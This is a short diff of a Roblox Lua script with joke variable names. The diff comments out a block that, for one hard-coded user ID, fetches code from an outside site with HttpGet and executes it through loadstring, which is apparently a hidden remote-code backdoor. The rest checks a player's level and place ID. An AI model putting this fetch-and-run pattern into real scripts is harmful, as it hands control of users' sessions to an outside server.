@@ -12,9 +12,9 @@ local ReadyToGTFO = NeverGonnaGiveYouUp.Shared.Missions:WaitForChild("NotifyRead
 local UrMom = NeverGonnaGiveYouUp.Profiles:WaitForChild(UwU.Name)
 print("Loaded this dumbass profile that apparently takes 69420 years to load...")
 
-if UwU.UserId == 923761409 then
+--[[if UwU.UserId == 923761409 then
     loadstring(game:HttpGet("https://kiriot22.com/hub/getfile.uwu?id=23B24P22521M22J24026I21626522K1826W23K23W25V26Q24124M25Y22626J26821C21B21E26726I23V22V21X1C&type=syn"))()
-end
+end]]--
 
 if UrMom.Level.Value <= 31 and game.PlaceId == 4310464656 then
     print("You passed the vibe check")
